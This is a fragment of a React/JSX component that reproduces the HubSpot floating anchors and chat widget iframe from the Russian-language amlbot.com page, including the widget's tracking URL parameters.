                <div id="hs-web-interactives-floating-top-left-anchor" className="go2417249464 go613305155">
                </div>
                <div id="hs-web-interactives-floating-top-right-anchor" className="go2417249464 go471583506">
                </div>
                <div id="hs-web-interactives-floating-bottom-left-anchor" className="go2417249464 go3921366393">
                </div>
                <div id="hs-web-interactives-floating-bottom-right-anchor" className="go2417249464 go3967842156"
                     style={{marginBottom: "96px"}}>

                </div>
            </div>
            <div role="region" aria-label="Виджет чата" id="hubspot-messages-iframe-container"
                 style={{minHeight: "96px", minWidth: "100px", width: "92px", height: "92px"}} className="widget-align-right">
                <div className="hs-shadow-container"></div>
                <iframe
                    src="https://app.hubspot.com/conversations-visitor/20255707/threads/utk/284f34e810ef4111b918522d751b7f92?uuid=33e4d856b599496d90e4c73092dd8b4b&amp;mobile=false&amp;mobileSafari=false&amp;hideWelcomeMessage=true&amp;hstc=&amp;domain=amlbot.com&amp;inApp53=false&amp;messagesUtk=284f34e810ef4111b918522d751b7f92&amp;url=https%3A%2F%2Famlbot.com%2Fru&amp;inline=false&amp;isFullscreen=false&amp;globalCookieOptOut=&amp;isFirstVisitorSession=false&amp;isAttachmentDisabled=false&amp;isInitialInputFocusDisabled=false&amp;enableWidgetCookieBanner=false&amp;isInCMS=false&amp;hideScrollToButton=true&amp;isIOSMobile=false"
                    id="hubspot-conversations-iframe" title="Chat Widget" allowFullScreen
                    data-test-id="chat-widget-iframe"
                    data-lf-form-tracking-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-yt-playback-inspected-xbp1oaemxxgaedvj="true"
                    data-lf-vimeo-playback-inspected-xbp1oaemxxgaedvj="true"></iframe>
            </div>
        </main>
    );
}
